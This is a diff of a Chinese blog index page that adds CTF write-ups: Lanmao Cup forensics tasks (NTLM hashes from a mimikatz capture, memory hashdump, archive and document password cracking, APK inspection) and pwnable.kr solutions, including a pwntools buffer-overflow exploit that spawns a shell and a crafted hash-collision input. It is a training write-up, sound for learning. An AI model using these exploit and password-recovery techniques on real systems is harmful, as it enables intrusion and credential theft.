@@ -156,12 +156,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -195,6 +195,589 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="R3ape1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="230">
+      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 230">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/" class="post-title-link" itemprop="url">蓝帽杯初赛WP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-12 19:49:00 / 修改时间：19:51:42" itemprop="dateCreated datePublished" datetime="2022-07-12T19:49:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/2022/" itemprop="url" rel="index"><span itemprop="name">2022</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">蓝帽杯初赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="misc-domainhacker"><a href="#misc-domainhacker" class="headerlink" title="misc_domainhacker"></a>misc_domainhacker</h1><p>下载附件，发现是流量分析题，用wireshark打开</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700049682.gif" class="" title="图片">
+
+<p>在这里找到了rar文件，导出后发现需要密码，于是继续探索</p>
+<p>在tcp追踪流13发现了有用信息</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004.gif" class="" title="图片">
+
+<p>阅读拼接进行base64解密试试</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006.gif" class="" title="图片">
+
+<p>发现了密码，解压压缩包</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008.gif" class="" title="图片">
+
+<p>发现是mimikatz工具的界面，于是在NTLM这里找到了hash值</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010.gif" class="" title="图片">
+
+
+
+<h1 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h1><p>用盘古石阅读器打开，搜索题目给出的图片的名字</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700345378.gif" class="" title="图片">
+
+<p>导出该图片，并查看该图片属性的详细信息，得到分辨率360x360</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-16573700345389.gif" class="" title="图片">
+
+
+
+<h1 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h1><p>题目要求是说让我们找到姜总的快递单号，那么试着搜索下关键字姜总</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737006076812.gif" class="" title="图片">
+
+<p>果然，在群组聊天中找到了快递单号</p>
+<h1 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h1><p>读题发现是内存取证，想到使用工具volatility，第一个要求我们获得taqi7的开机密码，于是用volatility跑跑看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 hashdump</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737008500914.gif" class="" title="图片">
+
+<p>找到了，发现是md5加密过的，md5解密</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737008501015.gif" class="" title="图片">得到开机密码anxinqi
+
+<h1 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h1><p>看下题目，要求我们查看进程号，volatility跑一下进程号看看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 pstree</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737010442218.gif" class="" title="图片">
+
+<p>看着这个很可疑，但我并不认识，上网搜一搜MagnetRAMCaptu</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737010442219.gif" class="" title="图片">
+
+<p>看到这里便可以放心提交答案了，查看下pid是2192</p>
+<h1 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h1><p>看题发现这个是磁盘性质的取证题了，于是用取证大师</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.jpg" class="" title="图片">
+
+<p>导出了三个文件，其中就有ppt</p>
+<p>word和ppt需要密码，还有一个是字典，立马想到了爆破，用passfab for word</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737014552022.gif" class="" title="图片">
+
+<p>文档密码是688561，打开没有发现什么，把ppt后缀改成docx也一样进行爆破</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737014552023.gif" class="" title="图片">
+
+<p>得到密码287fuweiuhfiute，改回后缀，输入密码打开，得到flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737014552024.gif" class="" title="图片">
+
+
+
+<h1 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h1><p>在e01文件中bitlocker解密出来，发现tc加密文件，寻找密钥</p>
+<p>根据题目提示，使用取证大师的工具：内存镜像解析工具进行解析</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737018007529.gif" class="" title="图片">
+
+<p>导出keyfile</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737018007531.gif" class="" title="图片">
+
+<p>新建案例，开始取证</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737018007530.gif" class="" title="图片">
+
+<p>发现哈哈哈.zip，导出该zip，直接暴力破解，得到密码991314</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737018007532.gif" class="" title="图片">
+
+<p>打开压缩包，得到flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010-165737018007533.gif" class="" title="图片">
+
+<p>flag{1349934913913991394cacacacacacc}</p>
+<h1 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h1><p> 将文件下载下来，然后将后缀改为”.zip”，拖入winrar中将配置文件AndroidManifest.xml解压出来。</p>
+<p>然后利用工具AXMLPrinter2将配置文件反编译，编译出来的文件内容中可以看到package字段如下图所示</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190538890.png" class="" title="image-20220709190538890">
+
+<p>所以flag为“exec.azj.kny.d.c”。</p>
+<h1 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h1><p>上题反编译出来的配置文件中有如下图所示内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190735776.png" class="" title="image-20220709190735776">
+
+<p>“android.intent.action.MAIN”则代表文集入口“属性”，外面一层的activity标签中的android name值就是入口程序</p>
+<p>所以flag为”minmtta.hemjcbm.ahibyws.MainActivity”.</p>
+<h1 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h1><p>将下载下来的文件拖入bytecode viewer中，根据上题的程序入口目录进去，可出现下图所示内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191141536.png" class="" title="image-20220709191141536">
+
+<p>根据代码大致就可以猜测base64解密的内容就是密文。</p>
+<p>所以flag为“aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6”</p>
+<h1 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h1><p>在bytecode viewer中可以看到很多被混淆加密的包，安全检测类很可能就在里面</p>
+<p>根据关键词查找发现如下内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191504565.png" class="" title="image-20220709191504565">
+
+<p>这应该就是与检测相关的一个类，但起不到检测的作用。再去上级目录看，看到class a中有下图所示关键字段</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191701294.png" class="" title="image-20220709191701294">
+
+<p>qemu是Android模拟器，用来模拟检测的，所以猜测这个类就是了。</p>
+<p>所以flag为“a”</p>
+<h1 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h1><p>题目提示有后门</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.gif" class="" title="图片">
+
+<p>d盾扫描获得flag</p>
+<h1 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h1><p>查看database.php发现密码与my_encrypt()有关，发现该函数在encrypt.php中将encrypt.php部署到本地环境中跑一下，获得flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202049506.png" class="" title="image-20220709202049506">
+
+
+
+<h1 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h1><p>在Channelorder.php和Channelorderlist.php中都有盐值即$key</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202224818.png" class="" title="image-20220709202224818">
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/bof(wp)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="R3ape1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="230">
+      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 230">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/bof(wp)/" class="post-title-link" itemprop="url">bof</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-12 19:46:00 / 修改时间：19:46:37" itemprop="dateCreated datePublished" datetime="2022-07-12T19:46:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/pwnable%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
+<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
+
+<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/flag(wp)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="R3ape1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="230">
+      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 230">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/flag(wp)/" class="post-title-link" itemprop="url">flag</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-12 19:46:00 / 修改时间：19:47:26" itemprop="dateCreated datePublished" datetime="2022-07-12T19:46:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/pwnable%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这是一道需要逆向脱壳的题</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>将下载下来的二进制文件拖入ida查看</p>
+<img src="/2022/07/12/flag(wp)/image-20220712192048750.png" class="" title="image-20220712192048750">
+
+<p>看到只有三个函数，很明显是被加壳了。</p>
+<p>在hex视图中进入一个函数，可以看到下图所示的字段</p>
+<img src="/2022/07/12/flag(wp)/image-20220712192148939.png" class="" title="image-20220712192148939">
+
+<p>现在可以确定这个二进制程序是被UPX加壳了，接下来只是需要将这个二进制文件脱壳，再用ida查看。</p>
+<h2 id="脱壳分析"><a href="#脱壳分析" class="headerlink" title="脱壳分析"></a>脱壳分析</h2><p>upx的安装这里不多赘述，主要是两个指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upx -d filename #脱壳</span><br><span class="line">upx filename #加壳</span><br></pre></td></tr></table></figure>
+
+
+
+<p>脱壳后再拖入ida就可以看到很多函数，进入main函数查看，如下图所示</p>
+<img src="/2022/07/12/flag(wp)/image-20220712193403427.png" class="" title="image-20220712193403427">
+
+
+
+<p>跟进到data段就可以看到flag的值</p>
+<img src="/2022/07/12/flag(wp)/image-20220712193553553.png" class="" title="image-20220712193553553">
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/collision(wp)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="R3ape1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="230">
+      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 230">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/collision(wp)/" class="post-title-link" itemprop="url">collision</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-12 19:43:00 / 修改时间：19:44:10" itemprop="dateCreated datePublished" datetime="2022-07-12T19:43:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/pwnable%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个简单的加密函数逆向的题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;		<span class="comment">//一个int型占4字节，所以类型转换后20字节的字符被分成了5个int型数字</span></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];	<span class="comment">//刚好循环5次，将5个数字累加起来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;		<span class="comment">//运行程序时需要传入一个外部参数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;		<span class="comment">//该外部参数长度必须等于20字节</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;		<span class="comment">//如果外部参数的值等于hashcode则打印flag</span></span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过分析上诉代码可以知道我们只要输入5个数字，并控制他们的和等于<code>0x21DD09EC</code>即可。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为<code>0x21DD09EC</code>不能被5整除，所以加一整除后再从某个数据中减一即可。</p>
+<p>所以我们要输入的5个数字的值为：<strong>0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC8</strong></p>
+<p>这里我们需要将16进制数转码为字符，4字节一组，表示一个16进制数，注意是小端序，所以要逆序写：</p>
+<p><strong>\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</strong></p>
+<p>最后借助python将这些字符作为参数传进去。</p>
+<h1 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &#x27;print &quot;\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br><span class="line">&quot;&#x27;`</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/fd(wp)/">
+
